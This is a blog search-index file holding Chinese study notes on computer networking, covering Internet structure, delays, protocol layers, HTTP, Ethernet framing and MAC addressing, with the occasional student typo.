<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Computer Networking A Top-Down Approach]]></title>
    <url>%2F2020%2F07%2F16%2FComputer-Networking-A-Top-Down-Approach%2F</url>
    <content type="text"><![CDATA[在开始任何旅行之前,我们首先要查看路线图,以便更熟悉前面的主要道路和交界处,对于我们着手从事的这个travel,最终目的是深入理解有关计算机网络的怎么,什么和为什么.我们的路线图是本书各章顺序.(本科建议前5章).BRIEF! 计算机网络和因特网 应用层 运输层 网络层 链路层与局域网 无线网络和移动网络 多媒体网络 计算机网络中的安全 网络管理 1.1什么是因特网因特网非常复杂,并且在不断变化,无论是对硬件和软件组件,还是对它所提供的服务而言都是如此.描述因特网的两种方法.一种是描述因特网的具体构成,即构成因特网的基本硬件和软件组件.另一种方法是根据为分布式应用提供服务的网络基础设施来描述因特网. 1.1.1具体构成描述许多非传统设备被联向因特网的情况下,Computer Networking有点过时了.准确来说所有这些设备都应该被称为主机(host)/端系统(end system). 端系统通过通信链路(communication link)和分组交换机(packer switch)连接到一起,不同类型的通信链路由不同的物理媒体组成,这些物理媒体包括同轴线缆,铜线,光纤和无线电频谱.不同的链路以不同的速率传输数据,链路的传输速率是以bps度量的.当一台端系统要向另一台端系统发送时,发送端系统将数据分段,并为每段加上首部字节.形成的信息包被称为分组(pakcet). 分组交换机从他的一条入通信链路接收到达的分组,并从它的一条出通信链路转发该分组.市面上流行着各种不同类型且各具特色的分组交换机,但是最著名的是路由器(router)和链路层交换机(link-layer switch).这两种类型的交换机朝着最终目的地转发分组.一个分组所经历的一系列通信链路和分组交换机称为通过该网络的路径(route或path). 端系统通过因特网服务提供商ISP(Internet Service Provider)接入因特网.每一个ISP是一个由多个分组交换机和多段通信链路组成的网络,不同ISP为端系统提供了各种不同类型的接入.高层ISP是由通过高速光纤链路互联的高速路由器构成的.无论是高层还是底层ISP网络,都是独立管理的,运行IP协议,遵从一定的命名和地址习惯. 端系统,分组交换机和其他因特网部件,都要运行控制因特网种信息接收和发送的一系列protocol.TCP(Transmission Control Protocol,传输控制协议)和IP(Internet Protocol,网际协议)是因特网中最重要的两个协议. 因特网标准(Internet standard)由因特网工程任务组(Internet Engineering Task Force,IETF).其标准文档被称为请求评论(Request For Comment,RFC). 公共因特网被特指为internet,还有许多不能与专用网络外部的主机交换信息的网络,如政府与公司的网络,被称为内联网(intranet).因为它们与公共因特网采用同样类型的主机,路由器,链路和协议. 1.1.2服务描述从为应用程序提供服务的基础设施的角度来描述因特网,则如email,web,对等文件共享(peer-to-peer)等涉及多台相互交换数据端系统的应用程序被称为分布式应用程序(distribution applicationtern). 与因特网相连的端系统提供了一个应用程序编程接口(Application Programming Interface),API规定了运行在一个端系统上的软件请求因特网基础设施向运行在另一个端系统上的特定目的的软件交付数据的方式. 1.1.3什么是协议 一个协议定义了在两个或多个通信实体之间交换的报文格式和次序,以及在报文传输和/或接收或其他事件方面所采取的动作. 1.2网络边缘端系统end system因其处在internet的边缘而被称作端系统,也因其容纳应用程序而被称为主机.主机被分为两类:客户机client和服务器server. 1.2.1客户机和服务器程序客户机程序client program是运行在一个端系统上的程序,他发出请求,并从运行在另一个端系统上的服务器程序server program接收服务.这种客户机-服务器模式是当前最流行的结构. 今天的因特网并未全都是有由与纯服务器交互的纯客户机程序组成的,越来越多的应用程序是p2p应用程序,其中的端系统执行客户机和服务器功能的程序.例如共享文件夹的访问与被访问. 1.2.2接入网即access network,将端系统连接到其边缘路由器edge router的物理链路.边缘路由器是端系统到任何其他远程端系统的路径上的第一台路由器.网路接入可大概不严格地分为一下几种类型: 住宅接入residential access,将家庭端系统与网络相连. 公司接入company access,将商业/教育机构中的端系统与网络相连. 无线接入wireless access,将移动端系统与网络相连. 住宅接入是指将家庭端系统与边缘路由器相连.一种住宅接入形式是通过普通模拟电话线用拨号调制调解器dial-up modern与住宅ISP相连.家用调制解调器将PC输出的数字信号转换为模拟形式,以便在模拟电话线上传输.模拟电话线由双绞铜线构成,就是与打普通电话相同的电话线.在模拟电话线的另一端,ISP的调制解调器再将模拟信号转换回数字形式,作为ISP路由器的输入.因此该接入网络仅是连同一条点对点拨号电话线一起的一对调制解调器. 宽带住宅接入有两种常见类型:用户数字线digital subscriber line,DSL和混合光纤同轴电缆hybrid fiber-coaxial cable,HFC. DSL接入一般是电话公司提供,其概念类似于调制解调器,是一种新型调制解调器技术,也运行在现有的双绞电话线上.其数据传输速率通常在两个方向上是不对称的,从ISP路由器道急停的速率比从家庭到ISP路由器的要更高.DSL在家庭和ISP之间将通信链路划分为三个不重叠频段: 高速下行信道,50KHz~1MHz频段. 中速上行通道,4kHz~50kHz频段. 普通的双向电话信道,位于0~4kHz频段. 这种方法使得单根DSL线路看起来像是3条单独的线路,因此一个电话呼叫和一个因特网连接能够同时共享DSL链路(频分多路复用技术). 虽然DSL和拨号调制解调器使用普通的电话线,但是HFC接入网扩展了当前用于广播电缆电视的电缆网络.在传统的电缆系统中,电缆头端Head end广播通过通州电缆和放大器的分配网络传向住宅.与DSL类似,HFC需要特殊的调制解调器称为电缆调制解调器cable modern,提供电缆因特网接入的公司通常要求用户购买/租用.电缆调制解调器通常是一种外部设备,通过一个以太网端口和家庭PC相连.电缆调制解调器分为两个信道,上行信道和下行信道.与DSL类似,下行信道分配更大的带宽.HFC的另一个重要特征是它共享广播媒体 1.2.3物理媒体 传输过程中,对于每个传输接收对,通过跨越一种物理媒体(physical medium)传播电磁波或光脉冲来发送该比特.该物理媒体能够具有多种形状和形式,并对沿途的每个传输接收对而言不必有相同类型. 物理媒体的例子包括双绞铜线,同轴电缆,多模光纤缆,地面无线电缆,地面无线频谱和卫星无线频谱.物理媒体划分为两类:导引型媒体(guided media)和非导引型媒体(unguided media).对于导引型媒体,电波沿着固体媒体被导引,对于非导引型媒体,电波在空气或者外层空间传播. 双绞铜线:最便宜最普遍的引导型传输媒体,一直用于电话网.双绞线由两根隔离的铜线组成,每根大约1mm,以规则的形式螺旋排列.这两根线被绞合起来以减少对邻近双绞线的电器干扰.通常许多双绞线捆扎在一起形成一根电缆,并在这些双绞线外面覆盖上保护性防护层.一堆电线构成一个通信链路.非屏蔽双绞线(unshielded twisted pair,UTP)常用在建筑物内的计算机网络即局域网LAN中.所能达到的数据传输速率取决于线的厚度以及传输方与接收方的距离.双绞线最终已经作为高速LAN联网的主要方式. 同轴电缆:同轴电缆由两个铜导体组成,但是这两根铜导体是同心的而非并行的,借助于这种结构和特殊的绝缘体和保护层,同轴电缆能够具有高比特速率.在电视系统中相当普遍.同轴电缆能够被用作引导式共享媒体,许多端系统能够直接与该电缆相连,而且所有的端系统都能接收由其他端系统发送的东西. 光缆:光纤是一种细而柔软的能够引导光脉冲的媒体,其中每一个脉冲表示一个比特.传输速率极高,不受电磁干扰.光载波(Optical Carrier)标准链路速率的范围从51.8Mbps到39.8Gbps,这些规格参数被称作OC-n,链路速率等于n×51.8Mbps. 陆地无线电信道:无线电信道承载电磁频谱中的信号.无需安装物理线路,并具有穿透墙壁,提供与移动用户连接以及长距离承载信号的能力.环境上考虑取决于路径损耗和遮挡衰落(但信号跨越距离和绕过/通过阻碍物体时,信号强度降低),多径衰落(由于干扰对象的信号反射)以及干扰(其他无线电信道/电磁信号).陆地无线电信道可以分为两类:运行在本地区域,跨越十到百米;运行在广域,跨越数万米;平常生活中的无线LAN使用了局域无线电信道,蜂窝接入技术使用了广域无线电信道. 卫星无线电通道:一颗通信卫星连接两个或者多个位于地球的微波发射方/接收方,被称为地面站.该卫星在一个频段上接收传输,使用一个转发器再生信号,并在另一个频率上传输信号.通信中使用两类卫星:同步卫星和低地球轨道卫星.同步卫星永久停留在地球上方相同的点上,这种静止的存在十通过将该卫星放置在地球表面上方36000km的轨道上取得的.所以从地面站到卫星再回地面站引入了280ms的时延.能以数百Mbps运行的卫星链路常用于电话网/因特网的主干.低地球轨道卫星围绕地球旋转,彼此通信.为了提供对一个区域的连续覆盖,需要放置相当多卫星. 1.3网络核心 网络核心:互联了因特网端系统的分组交换机和链路的网状结构. 1.3.1电路交换和分组交换通过网络链路和交换机移动数据有两种基本方法:电路交换circuit switching和分组交换packet switching.在电路交换网络中,沿着端系统路径,为端系统之间通信所提供的资源(缓存.链路传输速率)在通信会话期间会被预留.而在分组交换中,这些资源不会被预留.会话的报文按需使用这些资源,可能不得不排队接入通信线路.即前者需要预定,但是能够立即使用.后者无需预定,但是可能需要排队. 无处不在的电话网络是电路交换网络的例子.通过电话网向另一个人发送信息之前,需要建立连接.这是一个真正意义上的连接,因为此时沿着发送方和接收方之间的路径上的交换机能够为该连接维护连接状态.但是在静默期(slient period)资源的利用率会变低. 因特网则是分组交换网络的典范.因特网尽力而为best effort地以适时地方式传递分组,但是不做任何确保. 电路交换网络:eg:用4条链路互联4台电路交换机,这些拦路地每条都有n条电路,因此每条链路都能支持n条电路同时连接.每台主机都与一台交换机相连,所以要通信时该网络会在两台主机之间建立端到端连接.因此一个主机向另一个主机发送报文,必须在两条链路值一上先预留一条电路. 链路中的电路要么通过频分多路复用(Frequency-Division Multiplexing,FDM)实现,要么通过时分多路复用(Time-Division Multiplexing,TDM)实现. 对于FDM,链路的频谱由跨越链路创建的所有连接共享.该链路在连接期间为每条连接专用一个频段.在电话网络中,这个频段通常有4kHZ.该频段地宽度被称为带宽(bandwith).例如调频无线电台使用FDM来共享88-108MHZ的频谱,其中每个电台被分配一个特定的频带. 对于TDM链路,时间被划分为固定区间的帧,每帧划分为固定数量的时隙.当网络跨越一条链路创建连接时,该网络在每个帧中为该连接指定一个时隙.这些时隙专门由该连接单独使用,一个时隙可用于传输该连接在每个帧内的数据.一条电路的传输速率等于一个时隙中的比特数乘以该帧的速率. ![](D:\My Daily\P\QQ图片20200723195929.png) 传输时间与链路数目无关,因为只用指定的链路进行传输. 各种应用程序在完成其任务时要交换报文,报文能够包含协议设计者需要的任何东西,能够包含数据/控制功能.现代计算机网络中,源主机将长报文划分为较小的数据块并称之为分组.这些分组在源与目的地之间通过通信链路与分组交换机传送.分组以该链路最大速率在通信链路上传输. 传输时延/存储转发时延:多数分组交换机在链路的输入端使用存储转发传输机制,即在交换机开始向链路传输第一个比特之前,要先接收到所有的分组. 主机-链路-交换机—交换机-链路-主机 存储转发时延就指的是交换机得到第一个比特到最后一个比特的时间.在n段链路中一共要存储和转发n-1次,加上主机到交换机的一次,共n次. 排队时延:每个分组交换机有多条链路与之相连,对于每条链路该交换机都有一个输出缓存output buffer,用于存储路由器准备发往的那条链路的分组.如果到达的分组需要跨越链路传输,但是该链路正忙于其他分组,则该分组需在输出缓存中等待.因此此处存在排队时延.排队时延根据网络的情况而定.*如果等待传输的分组已经满了,则将出现分组丢失/丢包,可能是刚刚到达的分组也可能是正在排队的分组质疑被丢弃. * 电路交换不考虑需求而预先分配传输链路的使用,这使得已经分配但是不需要的链路未被利用.而分组交换按需分配.链路传输能力只分配给有需求的用户,这样的按需共享资源有时被称为资源的统计多路复用. 1.3.2分组是怎样通过分组交换形成其网络的分组交换机是如何确定分组与链路之间的对应关系的?在因特网中,每个通过网络传输的分组在其首部都包含了其目的地址.该地址是一种层次结构,当分组到达网络中的一台路由器时,该路由器检查地址的一部分并继续转发.每台路由器都有一个转发表,用于将目的地址与链路一一映射.分组到达之后,搜索,确定链路,转发. 转发表的设置:因特网有一些特殊的选路协议,它们用于自动地设置转发表(forwarding table).例如选录协议可以决定从每台路由器到每个目的地的最短路径,并使用这些最短路径来配置路由器中的转发表. 1.3.3ISP和因特网主干 因特网是网络的网络 在公共因特网中,坐落在因特网边缘的接入网络通过分层的ISP层次结构与因特网的其他部分相连.接入ISP一般位于该层次结构底部.该层次结构的最顶层是数量相对较少的第一层ISP. 第一层ISP特性: 直接与其他每一个第一层ISP相连; 与大量的第二层ISP和其他客户网络相连; 覆盖国际区域; 第一层ISP也被称作因特网主干(Internet backbone); 第二层ISP通常具有区域性或国家性的覆盖规模,并且非常重要地仅与少数第一层ISP相连接.因此为了到达全球因特网的大部分区域,第二次ISP的流量需要警告第一层ISP.第二次ISP被称作它所连接的第一层ISP的客户.一个第二层网络也可以选择与其他第二层网络相连,这种情况下流量不经过第一层ISP而直接流动.在第二层之下是较低层ISP,经过一个或多个第二层ISP与更大的因特网相连.当两个ISP彼此直接相连,它们是对等的peer. 在一个ISP网络中,某ISP与其他ISP的连接点为汇集点(Point of Presence).POP就是某ISP网络中的一台/多台路由器组,通过它们能够与其他ISP的路由器连接. 两个第一层ISP可以将一对POP连在一起,形成彼此对等,这一对POP的每端分属这两个ISP之一.此外两个ISP可以具有多个对等点,将两个或更多POP对彼此相连. 1.4分组交换网中的时延,丢包和吞吐量1.4.1分组交换网中的时延概述节点处理时延(nodal processing delay),排队时延(queuing delay),传输时延(transmission delay)和传播时延(propagation delay),这些时延加起来就是节点总时延(total nodal delay). 处理时延:检查分组首部和决定将该分组导向何处所需要的时间是处理时延的一部分.同时处理时延也包括其他因素,比如检查比特级差错所需要的时间. 排队时延:在队列中,分组在链路上等待传输时,经受排队时延.取决于网络状态(是否有其他分组排队等). 传输时延:仅当所有已经到达的分组被传输之后,才能开始对分组进行传输.即将所有分组推向链路需要的时间. 传播时延:一个比特被推向链路,开始向B传播.由该链路起点到路由器B传播所需要的时间为传播时延.显而易见,传播时延等于两台路由器之间的链路距离除以传播速率. 🎈传播时延是路由器将分组推出所需要的时间,是分组长度和链路传输速率的函数,而与两台路由器之间的距离无关.传播时延是一个比特从路由器A到B传播所需的时间,是路由器之间距离的函数,与分组长度/链路传输速率(不是传播速率)无关. 1.4.2排队时延和丢包排队时延对于不同的分组是不同的.eg:10个分组到达空队列,第一个分组的排队时延为0,第十个则最大. 排队时延的大小取决于流量到达该队列的速率,链路传输速率和到达流量的性质(周期性/突发性).a表示分组到达队列的平均速率,pkt/s.R为传输速率,比特从队列中推出的速率,bps.假设所有分组由L比特构成,则La/R被称作流量强度(traffic intensity),在估计排队时延的影响程度方面有很重要作用.流量强度大于1,队列的增加趋于无界.所以在流量工程中,设计系统时的流量强度不能大于1. 流量强度小于1时,显而易见影响排队时延的就是流量性质.第n个传输的分组有(n-1)L/Rs的排队时延. 在实际生活中,流量强度与平均排队时延的函数图像是向上开口二次函数的右半边.随着流量强度趋近于1,平均排队时延大大增加.流量强度的少量增加也会导致时延的大量增加.排队的容量是有限的,所以流量强度接近于1的时候,排队时延不会趋向无穷大.到达的分组发现是一个满的队列,则无处安放,路由器将丢弃这个分组.节点的性能不仅要根据时延来衡量,而且要根据分组丢失的概率衡量. 1.4.3端到端时延拨号调制解调器引入的调制/编码时延,媒体分组化时延. 1.4.4计算机网络中的吞吐量计算机网络中还有一颗性能测度是端到端吞吐量.瞬间吞吐量instantaneous throughout与平均吞吐量average throughout. 服务器-链路-路由器-链路-主机;这种简单的两链路网络,其吞吐量是min{Rc,Rs}(Rc=路由器与客户机之间的链路速率,Rs=服务器与路由器之间的链路速率)=瓶颈链路(bottleneck link)的传输速率. 计算机网络的核心就像是一个宽大的管子,所以比特从源向目的地流动速率是Rc与Rs的较小者.目前因特网中对吞吐量的限制因素通常是接入网. 吞吐量不仅取决于沿着路径的传输速率,而且取决于干扰流量.(许多数据流都通过一条链路流动,即使这条链路具有高传输速率,也可能成为文件传输的瓶颈链路. 1.5协议层次和它们的服务模型1.5.1分层的体系结构网络设计者以分层的方式组织协议,以及实现这些协议的网络硬件与软件.每个协议属于一层.每层通过在该层中执行某些动作,或直接使用下层的服务,来提供其服务. 一个协议层能够用软件/硬件或两者结合的方式来实现,HTTP/SMTP等应用层协议通常是在端系统中用软件实现的,运输层协议也是如此.网络层通常是硬件和软件的混合体.因为物理层和数据链路层负责处理跨特定链路的通信,它们通常在与给定链路相关的网络接口卡中实现.层n协议也分布在构成该网络的端系统,分组交换机和其他组件中,即层n协议的不同部分常常位于这些网络组件的各部分中. 各层的所有协议被称作协议栈protocol stack; 应用层是网络应用程序及其应用层协议留存的地方,HTTP/SMTP/FTP/DNS,创建并部署自己的新应用层协议是非常容易的.应用层分布在多个端系统上,一个短息用中的应用程序使用协议与另一个端系统中的应用程序交换信息分组.我们将这种位于应用层的信息分组称之为报文message. 运输层提供了在应用程序端点之间传输应用层报文的服务.有UDP/TCP两个运输层协议.前者向它的应用程序提供无连接服务,是一种不提供不必要服务的服务,不提供可靠性,无流量控制与拥塞控制.后者向它的应用程序提供面向连接的服务,包括了应用层报文向目的地确保传递和流量控制(发送方接收方速率匹配).并将长保温划分为短报文,并提供拥塞控制:当网络阻塞时,源抑制其传输速率.运输层分组成为报文段segment. 网络层负责将称为数据报datagram的网络层分组从一台主机移动到另一台主机.源主机中的运输层协议向网络层提交报文段与目的地址.网络层包括IP协议,与决定路由的选录协议,数据报根据该路由从源传输到目的地. 链路层分组称为帧frame.链路层提供的服务取决于应用于该链路的特定链路层协议.数据报从源到目的地传送通常需要经过几条链路,所以它可能被沿途不同链路上的不同链路层协议处理. 链路层的任务是将整个帧从一个网格元素移动到邻近的网格元素,物理层的任务是将该帧中的一个一个比特从一个节点移动到下一个节点.该层的协议仍然是链路相关的,并且进一步与链路的实际传输媒体相关. OSI参考模型:应用层,表示层,会话层,运输层,网络层,链路层与物理层.表示层的作用是使通信的应用程序能够解释交换数据的意义,提供数据压缩,数据加密以及数据描述.会话层提供了数据交换的定界和同步功能,包括建立检查点和恢复方案的方法. 1.5.2报文,报文段,数据报和帧每一层.分组具有两种类型的字段:首部字段和有效载荷字段(payload field).有效载荷通常来自上一层的分组. 应用层报文+运输层首部信息-&gt;运输层报文段transport-layer segment 运输层报文段+网络层首部信息-&gt;网络层数据报network-layer datagram 网络层数据报+链路层首部信息-&gt;链路层帧link-layer frame 1.6攻击威胁下的网络拒绝服务Denial-of-Service,DoS: 弱点攻击:向目标主机上运行的易受攻击的应用程序构造报文而造成拒绝服务. 带宽泛洪:向目的主机发送大量分组造成接入链路拥塞. 连接泛洪:在目标主机中创建大量的半开或全开TCP连接 分布式DoS:distributed DoS; 记录每个流经的分组拷贝的被动接收机被称为分组嗅探器. IP欺骗(IP spoofing) 中间人攻击(man-in-middle attack) 1.8Summary我们已经看到各种构成特别的因特网和普通的计算机网络的硬件和软件. 我们从网络的边缘开始,观察端系统和应用程序,以及运行在端系统上为应用程序提供的运输服务. 接着我们也观察了接入网中常见的链路层技术和物理媒体. 然后我们进入网络核心更深入地钻研网络,指出通过电信网络传输数据的两种基本方法:电路交换和分组交换,并且探讨了每种方法的长处和短处. 我们也研究了全球性因特网的结构,知道了因特网是网络的网络. 我们看到因特网的由较高层和较低层组成的层次结构,该网络扩展为包括数以千计的网络. 本章的后半部分,我们研究了计算机网络领域的几个重要主题.首先是分组交换网中的时延,吞吐量和丢包的原因. 我们研究了传输,传播和排队时延以及用于吞吐量的简单定量模型. 接下来我们研究了协议分层和服务模型,网络中的关键体系结构原则. 我们还概述了当今因特网中一些流行的安全攻击,并以计算机网络的简要历史结束. 2应用层在本章中,我们学习有关网络应用的原理和实现方面的知识.我们从定义几个关键字的应用层概念开始,其中包括应用程序所需要的网络服务,客户机和服务器,进程和运输层接口.然后详细讨论几种网络应用程序包括web,email,DNS,对等文件分发和P2P因特网电话.接下来将探讨开发运行在TCP和UDP上的网络应用程序的方法,特别是学习套接字API,并概要学习用Java实现的几个简单客户机/服务器应用. 2.1应用层协议原理 在研发新的应用时,并不需要考虑不同端系统之间的通信问题.因为网络核心设备并不在应用层起作用,而是在较低层起作用.具体来说就是网络层及下面层次.这种将应用软件限制在端系统的基本设计方法,促进了大量的因特网应用程序的研发与部署.(简单来说就是不用关心底层的事情了). 2.1.1网络应用程序体系结构应用程序的体系结构明显不同于网络的体系结构.应用程序体系结构由开发者设计,规定了如何在各种端系统上组织该应用程序.在选择应用程序体系结构时,应用程序研发者很坑利用现代网络应用程序中所使用的两种主流体系结构之一:客户机/服务器体系结构或对等体系结构. In client-server architecture,有一个总是打开的主机称之为服务器,服务来自客户机的请求.两个特征:该体系结构客户机之间不直接通信.服务器具有固定的,周知的IP地址.该体系结构常见的应用程序包括web,FTP,Telnet.Email.该体系结构常用主机集群/服务器场(server farm)创建强大的虚拟服务器.基于客户机/服务器体系结构的应用服务通常是基础设施密集(infrastructure intensive)的,因为它们要求服务提供商购买安装维护服务器场. In peer-to-peer architecture,对总是打开的基础设施服务器有最小的依赖,并且直接相互通信.目前大多数流量密集型应用程序都是P2P体系结构的.包括文件分发BitTorrent,文件搜索/共享,因特网电话skype.P2P体系结构最突出的特性之一是它的自扩展性self-scalability.如在一个p2p共享文件应用中,每个对等方都因请求文件产生负载,但是每个对等方向其他对等方分发文件也为系统增加了服务能力(没怎么听懂啥意思.),成本有效,因为不需要庞大的服务器基础设施和服务器带宽.另一方面,高开放与高度分布性质需要格外关注系统安全. 2.1.2进程通信 在操作系统术语中,进行通信的是进程process而非程序,进程可以认为是运行在端系统中的程序. 在相同端系统上的进程通信由操作系统本身规定. 不同端系统上的进程跨越计算机网络交换报文message而通信.发送进程创建并向网络中发送报文,接收进程接收这些报文,可能负责回送报文. 在给定的一对进程之间的通信会话中,发起通信的进程被标示为客户机,在绘画开始时等待联系的进程是服务器. 进程通过一个称为套接字socket的软件接口在网络上发送和接收报文,套接字是同一台主机内应用层与运输层之间的接口,由于其是在网络上建立网络应用程序的可编程接口,因此也称为应用程序和网络之间的应用程序编程接口(Application Programming Interface).应用程序开发者可以控制套接字在应用层端的所有,但对于运输层端只限于选择运输层协议与设定几个运输层参数. 包括因特网在内的很多网络提供了不止一种运输层协议,开发一个应用时,根据可用的运输层协议所提供的服务,选择一个为应用提供恰当服务的协议. 对应用程序的服务要求进行分类:可靠数据传输,吞吐量,定时与安全性. reliable data transfer,对数据有极高要求的情况下,必须确保应用程序一端发送的数据正确,完整地交付给应用程序另一端.对于容忍丢失的应用,loss-tolerant application来书评不提供可靠数据传输的运输层协议也是可以接受的.(如多媒体应用) 两个进程在一条网络路径上进行通信会话时,可用吞吐量就是发送进程能够向接收进程交付比特的速率.因为其他会话将沿着该网络路径上的带宽,并且这些其他会话将会到达与离开,所以可用吞吐量将随时间波动.确保吞吐量的服务对于大部分应用程序有着吸引力,具有吞吐量要求的应用程序称为带宽敏感的应用(bandwith-sensitive application).而弹性应用elastic application能够根据需要充分利用可以使用的吞吐量. 定时保证,可以以多种形式实现,例如设置发送方注入进套接字中的每个bit到达接收方套接字不迟于100ms,对于交互式实时应用程序非常适用.(网络会议,游戏). 运输层协议为应用程序提供一种或多种安全性服务,如加密发送进程传递的所有数据,并在接收进程接收前解密.这种服务对发送进程与接收进程保密,防止其以某种方式观察到数据.除了机密性之外的安全服务:数据完整性和端点鉴别. 2.1.4因特网提供的运输服务 TCP服务模型包括面向连接服务和可靠数据传输服务. 面向连接服务:在应用层数据报文开始流动之前,客户机程序和服务器程序之间相互交换运输层控制信息.TCP的三次握手提示客户机和服务器做好传输分组的准备.握手阶段之后,就在两个进程的套接字之间建立了一个TCP连接.这个连接是全双工的:连接双方的进程可以在此连接上同时进行报文收发.结束报文发送时,将拆除该连接.称之为面向连接的服务,而非连接服务,是因为两个进程之间是以一种非常松散的方式进行连接的. 可靠数据传输服务:依靠TCP协议进程通信时,数据是无差错,按适当顺序进行交付的. TCP协议还具有拥塞控制机制.网络出现拥塞,该机制会抑制源的发送进程. TCP的加强版本:Secure Scoket Layer即SSL.能够在TCP基础上提供关键的进程到进程的安全性服务.包括加密,数据完整性以及端点鉴别.SSL是在应用层实现的,使用SSL服务时把SSL的代码包含进去即可. UDP不提供不必要服务的轻量级运输层协议,仅提供最小服务.无连接(传输之前无握手过程).无拥塞机制.不可靠数据传输服务:UDP协议不保证报文能被接收进程接收到,并且到达的报文还可能是乱序的. 在对TCP与UDP的描述中,缺少对定时保证和吞吐量的描述,因为目前的因特网运输层协议并未提供这两种服务,只能在设计中单独实现. 进程寻址:为了识别接收进程,需要知道该主机的名称或者地址,以及用来指定目的主机上接收进程的标识.IP地址和端口号实现该功能. web服务进程使用的是80号端口,邮件服务进程SMTP使用的25号端口. 2.1.5应用层协议应用层协议定义了运行在不同端系统上的应用程序如何相互传递报文,特别是定义了:交换的报文类型,如请求报文与响应报文.各种报文类型的语法,如报文中各字段及详细描述.字段语义,及包含在字段中的信息的含义.进程何时/如何发送报文并对报文进行响应的规则. 2.2web应用和HTTP服务2.2.1HTTP概况 web的底层协议是超文本传输协议HTTP,是web的核心. HTTP协议由两部分实现:一个客户机程序一个服务器程序,运行在不同的端系统中,交换HTTP报文来进行会话. web页面由对象组成,对象即文件.多数web页面有一个基本HTML文件以及几个引用对象. 每个URL地址由两部分组成:存放对象的服务器主机名和对象的路径名. HTTP使用TAP作为其支撑运输层协议. HTTP是一个无状态协议,服务器返回的报文并不包含关于客户机的状态特征,所以立即再次请求也会再次响应. 2.2.2非持久连接与持久连接客户机与服务器进行长时间通信时,客户机发出一系列请求,服务器对每个请求进行响应.这一系列请求可以逐个发出,也可以间断发出.当交互运行于TCP协议上时,应用程序研制者要确定每个请求.响应对是经一个单独的TCP连接发送(非持久连接),还是所有的请求/响应经相同的TCP连接发送(持久连接). 默认方式下HTTP使用持久连接; 请求是对于对象而言的,TCP连接也是对于请求而言的,而不是一个请求对应整个HTML页面以及其中的对象.对于非持久连接,有n个对象则需请求n次,建立n个TCP连接. TCP还有串行和并行之分,用户可以设置浏览器来控制并行度. 往返时间(Round-Trip Time,RTT),即一个小分组从客户及到服务器再返回到客户机所花的时间. RTT包括分组传播时延,分组在中间路由器和交换机上的排队时延以及分组处理时延. TCP连接在三次握手中的活动:点击链接之后,客户机先先服务器发送一个小报文段,服务器用一个TCP小报文段做出确认和响应,最后客户机向服务器返回确认(和HTTP请求一起).一个RTT等于三次握手中前两个部分所耗费的时间.总的响应时间等于两个RTT加上服务器传输HTML的时间. ![](D:\My Daily\P\QQ图片20200724220617.png) 非持久连接的缺点:必须为每一个请求的对象建立和维护一个全新的连接.对于每个这样的连接,客户机和服务器都要分配TCP的缓冲区和变量,将给服务器带来负担. 但是在持久连接的情况下,相同的客户机和服务器的后续请求和响应报文可以通过相同的连接进行传送.特别是一个完整的web页面中的所有对象都可以用单个持久的TCP连接进行传送,更甚同一台服务器的多个页面传输到相同的客户机时,可以共用一个TCP连接.对这些对象的请求可以逐个发出而不必等待未决请求的回答.一般来说一个连接经过一个可配置的时间间隔仍未被使用,服务器将关闭该连接. HTTP请求报文的第一行叫做请求行request line,后继的行叫做首部行header line.]]></content>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[互联网协议入门]]></title>
    <url>%2F2020%2F07%2F16%2F%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[硬学计网的时候有些头大,找到了这篇文章,首先对整体有一个认识,再换一本书,机械工业出版社的《Computer Networking A Top-Down Approach》. 序互联网的核心是一系列协议,总称为互联网协议:Internet Protocol Suite.它们对电脑如何连接和组网,做出了详尽的规定.理解了这些协议的规定,就理解了互联网的原理. 概述五层模型自顶向下分别为应用层Application Layer,传输层Transport Layer,网络层Network Layer,链路层Link Layer和物理层Physical Layer.越下面的层越靠近硬件,越上面的层越靠近用户. 层与协议每一层都是为了完成某一种功能,为了实现这些功能就要传输时遵循共同的规则protocol.互联网的每一层都定义了很多协议,这些协议的总称为互联网协议. 物理层电脑要组网,首先就要先把电脑连接起来,可以用光缆,线缆,双绞线和无线电波等方式(咋和谢希仁版有点不一样?还是我记错了).这就叫做物理层.它主要规定了网络的一些电气特性,作用是负责传输0和1的电信号. 链路层定义单纯的0和1并没有意义,必须规定其解读方式:多少个电信号算一组,每个信号有何意义?链路层的功能就是在实体层的上方确定0和1的分组方式. 以太网协议Ethernet规定,一组电信号构成一个数据包叫做帧(Frame).每一帧分为两个部分:标头Head与数据Data.Head包含数据包的一些说明项,如发送者,接收者,数据类型.数据则是数据包的具体内容. 标头的长度固定为18字节,数据的长度最短为46字节,最长为1500字节.因此对于一帧来说,大小区间为64-1518字节.数据过长则分为多个帧发送. MAC地址传输数据的过程中要标识发送者与接收者,就要使用到MAC地址.Ethernet规定连入网络的所有设备都必须有网卡接口,数据包必须是从一块网卡传送到另一块网卡.网卡的地址就是数据包的发送地址与接收地址即MAC地址.每块网卡出场时都有一个唯一的MAC地址,长度为48个二进制位,常用12个16进制数表示.前6个位厂商编号,后六个为该厂商网卡流水号. 广播一块网卡要知道另一块网卡的MAC地址,要使用到ARP协议(在谢希仁版中自学过,现在又给忘了…); 知道MAC地址之后,系统怎样才能把数据包准确送到接收方?Ethernet并不把数据包准确送到接收方,而是向本网络所有计算机发送,让计算机自己判断是否为接收方.而向本网络所有计算机发包的行为,就叫做广播broadcasting. 网络层网络层的由来根据Ethernet协议,依靠MAC地址发送数据,理论上和技术上世界上任何一个地方的网卡都能够找到任何一个地方的网卡.但是这样做有一个巨大的缺点”以太网采用广播的方式发送数据包,每个成员都会收到所有的包.不仅效率低,而且只能在发送者的子网络中传播.(如果互联网上每一台计算机都收到所有的包不可想象). 所以必须找到一种方法,能够区分MAC地址是否属于一个子网络.如果属于一个子网络,采用广播的形式发送,否则采用路由(路由即向不同的子网络分发数据包).而MAC地址只与厂商有关与网络无关,所以网络层诞生了. 它的作用是引进一套新的地址,使我们能够区分不同的计算机是否属于一个子网络. 于是网络层出现后,每台计算机就有了两种地址,一种是MAC地址,另一种是网络地址(二者之间无任何联系).网络地址帮助我们确定计算机所在的子网络,MAC地址则将数据包送到该子网络的目标网卡.所以从逻辑上看一定是先处理网络地址,再处理MAC地址. 